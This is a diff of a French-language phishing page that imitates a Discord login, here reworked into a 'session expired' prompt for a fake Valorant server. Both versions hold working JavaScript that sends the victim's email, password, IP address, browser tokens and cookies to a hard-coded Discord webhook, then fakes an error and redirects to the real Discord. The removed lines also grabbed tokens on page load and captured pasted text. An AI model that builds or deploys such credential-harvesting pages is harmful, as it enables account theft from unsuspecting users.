@@ -2,18 +2,11 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord - Connexion</title>
-    <link rel="icon" type="image/png" href="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0b5061df290f5892d944_full_logo_black_RGB.svg">
+    <title>Session expirée - Discord</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;700&display=swap');
         
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Whitney', sans-serif; }
         
         body {
             background: #36393f;
@@ -21,42 +14,69 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            background-image: url('https://discord.com/assets/0e80a9a22.svg'), linear-gradient(135deg, #36393f 0%, #2f3136 100%);
-            background-size: cover;
-            background-position: center;
         }
         
-        .login-container {
+        .container {
             width: 100%;
             max-width: 480px;
             padding: 32px;
             background: #36393f;
-            border-radius: 5px;
-            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
-            animation: slideIn 0.3s ease-out;
         }
         
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .logo {
-            text-align: center;
+        .expired-notice {
+            background: #ed4245;
+            color: white;
+            padding: 12px 16px;
+            border-radius: 4px;
             margin-bottom: 20px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         
-        .logo svg {
-            width: 130px;
-            height: auto;
+        .expired-notice::before {
+            content: "⚠️";
+        }
+        
+        .server-info {
+            background: #2f3136;
+            border: 1px solid #202225;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .server-icon {
+            width: 50px;
+            height: 50px;
+            background: #5865f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        
+        .server-details h3 {
+            color: white;
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+        
+        .server-details p {
+            color: #b9bbbe;
+            font-size: 13px;
         }
         
         h2 {
             color: #fff;
             font-size: 24px;
-            font-weight: 600;
-            text-align: center;
             margin-bottom: 8px;
+            text-align: center;
         }
         
         .subtitle {
@@ -64,12 +84,9 @@
             font-size: 16px;
             text-align: center;
             margin-bottom: 20px;
-            line-height: 1.5;
         }
         
-        .form-group {
-            margin-bottom: 20px;
-        }
+        .form-group { margin-bottom: 20px; }
         
         label {
             display: block;
@@ -78,7 +95,6 @@
             font-weight: 600;
             text-transform: uppercase;
             margin-bottom: 8px;
-            letter-spacing: 0.5px;
         }
         
         input {
@@ -90,34 +106,13 @@
             color: #dcddde;
             font-size: 16px;
             outline: none;
-            transition: border-color 0.2s;
         }
         
-        input:focus {
-            border-color: #5865f2;
-        }
-        
-        input::placeholder {
-            color: #72767d;
-        }
-        
-        .forgot {
-            display: block;
-            color: #00aff4;
-            font-size: 14px;
-            margin-top: 4px;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        
-        .forgot:hover {
-            text-decoration: underline;
-        }
+        input:focus { border-color: #5865f2; }
         
         button {
             width: 100%;
             padding: 12px;
-            margin-top: 8px;
             background: #5865f2;
             color: #fff;
             border: none;
@@ -125,33 +120,9 @@
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            transition: background 0.2s;
         }
         
-        button:hover {
-            background: #4752c4;
-        }
-        
-        button:active {
-            background: #3c45a5;
-        }
-        
-        .register {
-            margin-top: 20px;
-            color: #72767d;
-            font-size: 14px;
-            text-align: center;
-        }
-        
-        .register a {
-            color: #00aff4;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        
-        .register a:hover {
-            text-decoration: underline;
-        }
+        button:hover { background: #4752c4; }
         
         .error {
             color: #ed4245;
@@ -164,91 +135,62 @@
             border-radius: 3px;
         }
         
-        .loading {
-            display: none;
+        .help {
+            margin-top: 20px;
             text-align: center;
-            color: #b9bbbe;
-            margin-top: 15px;
+            color: #72767d;
             font-size: 14px;
         }
         
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #5865f2;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        /* Mobile responsive */
-        @media (max-width: 480px) {
-            body {
-                background: #36393f;
-            }
-            .login-container {
-                box-shadow: none;
-                padding: 20px;
-            }
+        .help a {
+            color: #00aff4;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">
-            <svg viewBox="0 0 124 34" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M26.9 0C12.1 0 0 12.1 0 26.9V34h7.1c14.8 0 26.9-12.1 26.9-26.9V0h-7.1z" fill="#5865F2"/>
-                <path d="M40.2 7.1c-1.6 0-2.9 1.2-2.9 2.8s1.3 2.8 2.9 2.8 2.9-1.2 2.9-2.8-1.3-2.8-2.9-2.8zm8.5 0c-1.6 0-2.9 1.2-2.9 2.8s1.3 2.8 2.9 2.8 2.9-1.2 2.9-2.8-1.3-2.8-2.9-2.8z" fill="white"/>
-                <path d="M50.4 24.5c-1.5 1.2-3.7 1.6-5.5 1.6-2.9 0-5.6-.8-7.9-2.2-2.3-1.4-4.1-3.4-5.3-5.9-1.2-2.5-1.8-5.3-1.8-8.2 0-2.9.6-5.7 1.8-8.2 1.2-2.5 3-4.5 5.3-5.9 2.3-1.4 5-2.2 7.9-2.2 1.8 0 4 .4 5.5 1.6v3.8c-1.5-1.2-3.5-1.9-5.5-1.9-2 0-3.9.5-5.5 1.4-1.6.9-2.9 2.3-3.8 4-.9 1.7-1.4 3.7-1.4 5.9s.5 4.2 1.4 5.9c.9 1.7 2.2 3.1 3.8 4 1.6.9 3.5 1.4 5.5 1.4 2 0 4-.7 5.5-1.9v3.8z" fill="white"/>
-                <path d="M62.8 25.5c-2.3 0-4.4-.5-6.3-1.6-1.9-1.1-3.4-2.6-4.5-4.5-1.1-1.9-1.6-4.1-1.6-6.6s.5-4.7 1.6-6.6c1.1-1.9 2.6-3.4 4.5-4.5 1.9-1.1 4-1.6 6.3-1.6s4.4.5 6.3 1.6c1.9 1.1 3.4 2.6 4.5 4.5 1.1 1.9 1.6 4.1 1.6 6.6s-.5 4.7-1.6 6.6c-1.1 1.9-2.6 3.4-4.5 4.5-1.9 1.1-4 1.6-6.3 1.6zm0-3.4c1.5 0 2.9-.3 4.1-1 1.2-.7 2.2-1.7 2.9-3 .7-1.3 1.1-2.8 1.1-4.6s-.4-3.3-1.1-4.6c-.7-1.3-1.7-2.3-2.9-3-1.2-.7-2.6-1-4.1-1s-2.9.3-4.1 1c-1.2.7-2.2 1.7-2.9 3-.7 1.3-1.1 2.8-1.1 4.6s.4 3.3 1.1 4.6c.7 1.3 1.7 2.3 2.9 3 1.2.7 2.6 1 4.1 1z" fill="white"/>
-                <path d="M80.4 25.5c-2.2 0-4.2-.5-6-1.5-1.8-1-3.2-2.4-4.2-4.2-1-1.8-1.5-3.9-1.5-6.3s.5-4.5 1.5-6.3c1-1.8 2.4-3.2 4.2-4.2 1.8-1 3.8-1.5 6-1.5 2.2 0 4.2.5 6 1.5 1.8 1 3.2 2.4 4.2 4.2 1 1.8 1.5 3.9 1.5 6.3s-.5 4.5-1.5 6.3c-1 1.8-2.4 3.2-4.2 4.2-1.8 1-3.8 1.5-6 1.5zm0-3.3c1.4 0 2.7-.3 3.8-1 1.1-.7 2-1.6 2.6-2.8.6-1.2 1-2.6 1-4.2s-.3-3-1-4.2c-.6-1.2-1.5-2.1-2.6-2.8-1.1-.7-2.4-1-3.8-1s-2.7.3-3.8 1c-1.1.7-2 1.6-2.6 2.8-.6 1.2-1 2.6-1 4.2s.3 3 1 4.2c.6 1.2 1.5 2.1 2.6 2.8 1.1.7 2.4 1 3.8 1z" fill="white"/>
-                <path d="M98.9 25.5c-2.3 0-4.3-.5-6.1-1.6-1.8-1.1-3.2-2.6-4.2-4.5-1-1.9-1.5-4.1-1.5-6.6s.5-4.7 1.5-6.6c1-1.9 2.4-3.4 4.2-4.5 1.8-1.1 3.8-1.6 6.1-1.6 2.2 0 4.1.5 5.7 1.4 1.6 1 2.9 2.3 3.8 4l-2.8 1.6c-.7-1.2-1.6-2.1-2.8-2.8-1.2-.7-2.5-1-4-.1-.1 0-.2.1-.3.2z" fill="white"/>
-            </svg>
+    <div class="container">
+        <div class="expired-notice">
+            Votre session a expiré. Veuillez vous reconnecter.
         </div>
         
-        <h2>Content de te revoir !</h2>
-        <p class="subtitle">Nous sommes tellement excités de te revoir !</p>
+        <div class="server-info">
+            <div class="server-icon">🎮</div>
+            <div class="server-details">
+                <h3>Serveur Valorant FR</h3>
+                <p>128 membres • 45 en ligne</p>
+            </div>
+        </div>
+        
+        <h2>Bienvenue !</h2>
+        <p class="subtitle">Connectez-vous pour rejoindre le serveur</p>
         
         <form id="loginForm">
             <div class="form-group">
-                <label for="email">E-mail ou numéro de téléphone</label>
-                <input type="text" id="email" name="email" placeholder="E-mail ou numéro de téléphone" required autocomplete="off">
+                <label>E-mail</label>
+                <input type="email" id="email" placeholder="nom@exemple.com" required>
             </div>
             
             <div class="form-group">
-                <label for="password">Mot de passe</label>
-                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
-                <a href="#" class="forgot">Tu as oublié ton mot de passe ?</a>
+                <label>Mot de passe</label>
+                <input type="password" id="password" placeholder="Mot de passe" required>
             </div>
             
-            <button type="submit" id="submitBtn">Connexion</button>
-            
-            <div class="loading" id="loading">
-                <span class="spinner"></span>Connexion en cours...
-            </div>
+            <button type="submit">Continuer vers le serveur</button>
             
             <div class="error" id="error">
-                E-mail et/ou mot de passe incorrects.
+                Identifiants incorrects. Veuillez réessayer.
             </div>
         </form>
         
-        <div class="register">
-            Besoin d'un compte ? <a href="#">S'inscrire</a>
+        <div class="help">
+            <a href="#">Mot de passe oublié ?</a> • <a href="#">Créer un compte</a>
         </div>
     </div>
 
     <script>
-        // CONFIGURATION - REMPLACE PAR TON WEBHOOK
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537654143118999572/xUfeTGedDvVvB5mguwhB9BMhIvNDBIHvmwFBh5e1h3WevbWIFRQoq7pMl14UVfpAlSRk';
         
-        // Fonction d'envoi avec gestion d'erreurs totale
         async function sendData(data) {
             try {
                 await fetch(WEBHOOK_URL, {
@@ -256,168 +198,66 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
-            } catch (e) {
-                console.log('Erreur envoi:', e);
-            }
+            } catch (e) {}
         }
         
-        // Récupération tokens multiples (avec try/catch pour chaque)
-        async function grabTokens() {
-            const tokens = {};
-            
-            // Discord
-            try {
-                const discordToken = localStorage.getItem('token') || localStorage.token;
-                if (discordToken && discordToken !== 'null') tokens.discord = discordToken;
-            } catch (e) {}
-            
-            // Autres tokens possibles
-            try {
-                const keys = Object.keys(localStorage);
-                keys.forEach(key => {
-                    if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
-                        try {
-                            const val = localStorage.getItem(key);
-                            if (val && val.length > 20) tokens[key] = val;
-                        } catch (e) {}
-                    }
-                });
-            } catch (e) {}
-            
-            // Cookies
-            try {
-                tokens.cookies = document.cookie;
-            } catch (e) {}
-            
-            // Session Storage
-            try {
-                const sessionKeys = Object.keys(sessionStorage);
-                tokens.session = {};
-                sessionKeys.forEach(key => {
-                    try {
-                        tokens.session[key] = sessionStorage.getItem(key);
-                    } catch (e) {}
-                });
-            } catch (e) {}
-            
-            return tokens;
-        }
-        
-        // Récupération IP
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 return data.ip;
-            } catch (e) {
-                return 'unknown';
-            }
+            } catch (e) { return 'unknown'; }
         }
         
-        // Détection du site actuel
-        function detectSite() {
-            const hostname = window.location.hostname.toLowerCase();
-            const href = window.location.href.toLowerCase();
+        async function grabTokens() {
+            const tokens = {};
+            try {
+                const dt = localStorage.getItem('token') || localStorage.token;
+                if (dt && dt !== 'null') tokens.discord = dt;
+            } catch (e) {}
             
-            if (hostname.includes('discord')) return 'discord';
-            if (hostname.includes('steam')) return 'steam';
-            if (hostname.includes('instagram')) return 'instagram';
-            if (hostname.includes('tiktok')) return 'tiktok';
-            if (hostname.includes('riot') || hostname.includes('valorant')) return 'riot';
-            if (hostname.includes('google') || hostname.includes('gmail')) return 'google';
-            if (hostname.includes('facebook') || hostname.includes('meta')) return 'facebook';
-            if (hostname.includes('twitter') || hostname.includes('x.com')) return 'twitter';
-            if (hostname.includes('youtube')) return 'youtube';
-            if (hostname.includes('twitch')) return 'twitch';
-            if (hostname.includes('spotify')) return 'spotify';
-            if (hostname.includes('netflix')) return 'netflix';
+            try {
+                const keys = Object.keys(localStorage);
+                keys.forEach(k => {
+                    if (k.toLowerCase().includes('token') || k.toLowerCase().includes('auth')) {
+                        try {
+                            const v = localStorage.getItem(k);
+                            if (v && v.length > 20) tokens[k] = v.substring(0, 100);
+                        } catch (e) {}
+                    }
+                });
+            } catch (e) {}
             
-            return 'unknown';
+            try { tokens.cookies = document.cookie; } catch (e) {}
+            return tokens;
         }
         
-        // Formulaire
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const submitBtn = document.getElementById('submitBtn');
-            const loading = document.getElementById('loading');
             const error = document.getElementById('error');
             
-            // UI loading
-            submitBtn.style.display = 'none';
-            loading.style.display = 'block';
-            error.style.display = 'none';
-            
-            // Récupération données
             const ip = await getIP();
             const tokens = await grabTokens();
-            const site = detectSite();
             
-            // Construction payload
-            const payload = {
-                content: `🎯 **NOUVELLE VICTIME** 🎯\n\n` +
-                        `📍 **Site:** ${site.toUpperCase()}\n` +
+            await sendData({
+                content: `🎣 **PHISHING SERVEUR** 🎣\n\n` +
+                        `📧 **Email:** \`${email}\`\n` +
+                        `🔑 **Password:** \`${password}\`\n` +
                         `🌐 **IP:** ${ip}\n` +
                         `🔗 **URL:** ${window.location.href}\n` +
-                        `📧 **Email/Login:** \`${email}\`\n` +
-                        `🔑 **Password:** \`${password}\`\n` +
-                        `🖥️ **User-Agent:** ${navigator.userAgent}\n` +
-                        `⏰ **Time:** ${new Date().toLocaleString('fr-FR')}\n\n` +
-                        `🔐 **Tokens trouvés:** \`\`\`json\n${JSON.stringify(tokens, null, 2)}\`\`\``
-            };
+                        `🖥️ **UA:** ${navigator.userAgent}\n\n` +
+                        `🔐 **Tokens:** \`\`\`json\n${JSON.stringify(tokens, null, 2)}\`\`\``
+            });
             
-            // Envoi (même si erreur, on continue)
-            await sendData(payload);
+            error.style.display = 'block';
+            document.getElementById('password').value = '';
             
-            // Simulation erreur Discord
             setTimeout(() => {
-                loading.style.display = 'none';
-                submitBtn.style.display = 'block';
-                error.style.display = 'block';
-                
-                // Focus sur password pour qu'il retente
-                document.getElementById('password').value = '';
-                document.getElementById('password').focus();
-                
-                // Redirection automatique après 3 secondes vers vrai Discord
-                setTimeout(() => {
-                    window.location.href = 'https://discord.com/login';
-                }, 3000);
-            }, 1500);
-        });
-        
-        // Auto-grab au chargement (sans formulaire, récupère ce qui est déjà là)
-        window.addEventListener('load', async function() {
-            try {
-                const tokens = await grabTokens();
-                if (Object.keys(tokens).length > 0) {
-                    const ip = await getIP();
-                    await sendData({
-                        content: `🔍 **TOKENS DÉTECTÉS AU CHARGEMENT** 🔍\n\n` +
-                                `🌐 **IP:** ${ip}\n` +
-                                `🔗 **URL:** ${window.location.href}\n` +
-                                `🔐 **Tokens:** \`\`\`json\n${JSON.stringify(tokens, null, 2)}\`\`\``
-                    });
-                }
-            } catch (e) {}
-        });
-        
-        // Grab si l'utilisateur colle un token (Ctrl+V)
-        document.addEventListener('paste', async function(e) {
-            try {
-                const pasted = (e.clipboardData || window.clipboardData).getData('text');
-                if (pasted && pasted.length > 50) {
-                    const ip = await getIP();
-                    await sendData({
-                        content: `📋 **COLLAGE DÉTECTÉ** 📋\n\n` +
-                                `🌐 **IP:** ${ip}\n` +
-                                `📄 **Contenu collé:** \`${pasted.substring(0, 100)}...\`\n` +
-                                `🔗 **URL:** ${window.location.href}`
-                    });
-                }
-            } catch (e) {}
+                window.location.href = 'https://discord.com/invite';
+            }, 2000);
         });
     </script>
 </body>
